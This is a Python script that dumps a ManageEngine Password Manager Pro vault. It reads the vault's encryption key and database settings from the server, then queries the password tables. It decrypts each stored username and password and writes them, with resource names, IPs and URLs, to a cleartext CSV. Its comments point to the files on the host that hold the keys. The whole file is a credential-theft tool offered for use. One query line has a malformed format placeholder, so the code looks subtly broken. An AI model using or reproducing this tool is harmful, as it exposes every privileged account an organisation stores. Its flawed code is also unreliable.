from Crypto.Cipher import AES
import Crypto
import os
import base64
import hashlib
import MySQLdb
import codecs
import csv
import sys

# Connects to a manageengine database and retrieves cleartext credentials. Outputs to a CSV.

passphrase = b'' # get this from pmp_key.key file. Make sure to delete any escape characters "\=" in the key should be "="! 

# Get the following database configuration information from database_params.conf
database_password = "" 
database_user = "root" 
database_host = "localhost" 
database = "PassTrix"
database_port = 2345

database_decryption_passphrase = "" # Used by the AES_DECRYPT database function - grep the filesystem for AES_ENCRYPT...? There are a few files that should have the password in there SOMEWHERE... it should exist in the ibdata1 file as well, just don't have a reliable way to achieve this programatically...
# sample db query:
# select AES_DECRYPT(password,"DB_ENCRYPTION_KEY") from ptrx_passbasedauthen;
# ...
# |    405 | <base64_data>                                                                    |
# |    406 | <base64_data>                                                                    |
# +----------+----------------------------------------------------------------------------------+

db = MySQLdb.connect(host=database_host,
                    port=database_port,   
                     user=database_user,
                     passwd=database_password, 
                     db=database) 

def reveal_yoself(ciphertext):
    if not ciphertext:
        return None
    key =  passphrase + (b" " * (32 - len(passphrase))) # turn a 16byte password into a 32 byte one by padding with SPACES (i thought we were using pbkdf2 here? oh well...)!
    pbkdf2_key = hashlib.pbkdf2_hmac("sha1", key, b"\x01\x02\x03\x04\x05\x06\x07\x08", 1024, dklen=32)
    ctr = Crypto.Util.Counter.new(128, initial_value=int(codecs.encode(base64.b64decode(ciphertext)[:16], 'hex'), 16))
    cipher = AES.AESCipher(pbkdf2_key, AES.MODE_CTR, counter=ctr)
    return cipher.decrypt(base64.b64decode(ciphertext)[16:])

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python {} filename.csv".format(sys.argv[0]))
        sys.exit(1)
    headers = ['Resource ID', 'Resource name',"Domain name", "IP address", "URL", "Description","Username", "Cleartext password"]
    cur = db.cursor()
    cur.execute('select ptrx_account.RESOURCEID, AES_DECRYPT(ptrx_resource.RESOURCENAME,"{0}"), ptrx_resource.DOMAINNAME,ptrx_resource.IPADDRESS,ptrx_resource.RESOURCEURL, ptrx_password.DESCRIPTION, AES_DECRYPT(ptrx_account.LOGINNAME,"{0}}"), AES_DECRYPT(ptrx_passbasedauthen.PASSWORD,"{0}") from ptrx_passbasedauthen LEFT OUTER JOIN (ptrx_password, ptrx_resource, ptrx_account) ON (ptrx_passbasedauthen.PASSWDID = ptrx_password.PASSWDID AND ptrx_passbasedauthen.PASSWDID = ptrx_account.PASSWDID AND ptrx_account.RESOURCEID = ptrx_resource.RESOURCEID);'.format(database_decryption_passphrase))
    with open(sys.argv[1], "w") as f:
        csvfile = csv.writer(f, dialect='excel')
        csvfile.writerow(headers)
        for row in cur.fetchall():
            row = list(row)
            decrypted_pw = reveal_yoself(row[7])
            row[7] = decrypted_pw
            if any(row):
                csvfile.writerow(row)
    db.close()